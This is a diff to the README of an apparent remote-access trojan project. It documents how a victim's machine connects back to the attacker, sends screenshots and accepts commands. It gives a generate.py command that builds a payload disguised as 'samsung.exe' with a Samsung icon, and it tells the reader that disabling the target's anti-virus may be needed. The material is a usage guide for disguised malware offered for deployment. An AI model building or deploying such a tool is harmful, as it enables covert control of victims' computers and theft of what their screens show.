@@ -45,12 +45,14 @@ Feedbacks(specially bads ones) are appreciated :)
 - Once the connection is established, the image of the victim's screen is sent to the attacker and stored in a file(which is specified by the user). After the data is sent, the victim closes the connection and the attacker continues listening for inbound connnection on the very same port. Note that the second increment from _MAIN PORT_, in this case 5002, is used for the third connection(the dashed line on the diagram). No name for this connection yet
 ## Example ##
 ![image](https://user-images.githubusercontent.com/91953982/198356174-05291422-f6f9-482f-8632-213ef01af8ce.png)
-- `Host` defaults to *127.0.0.*
+- `Host` defaults to *127.0.0.1*
 - `Main port` defaults to 5000
-- Using the command, you will get an executable named samumg.exe. For this demo i created s shortcut to the windows desktop
+- Using the command, you will get an executable named samsung.exe. For this demo i created a shortcut to the windows desktop
 -     python generate.py -H 192.168.100.115 -N samsung.exe -i=logos/samsung.ico
 ![image](https://user-images.githubusercontent.com/91953982/198357623-35133f42-1c8b-4ce2-a6af-55f9f787cae6.png)
-- Upon executing the payload, the victim connects to the attackers machine and this is what the attacker sees
+- Upon executing the payload, the victim connects to the attacker's machine and this is what the attacker sees
+![image](https://user-images.githubusercontent.com/91953982/198358718-30965c80-cf08-4d48-8be4-89b3f72ad15d.png)
+- The attacker can now run commands. Note that I'm in the same VM for this demo. It also works on remote hosts through  you may have to temporarily disable the host's anti-virus
 
 
 ## Drawback ##
